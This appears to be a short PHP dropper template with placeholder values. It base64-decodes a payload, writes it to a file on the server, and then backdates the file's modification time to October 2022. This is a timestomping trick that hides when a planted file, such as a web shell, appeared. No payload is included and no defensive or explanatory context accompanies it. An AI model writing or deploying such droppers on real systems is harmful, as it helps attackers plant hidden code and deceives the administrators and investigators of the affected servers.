<?php
$code_b64 = '8888';
$code = base64_decode($code_b64);
$file = "9999";
file_put_contents($file,$code);
touch("9999",mktime(19,5,10,10,26,2022));
?>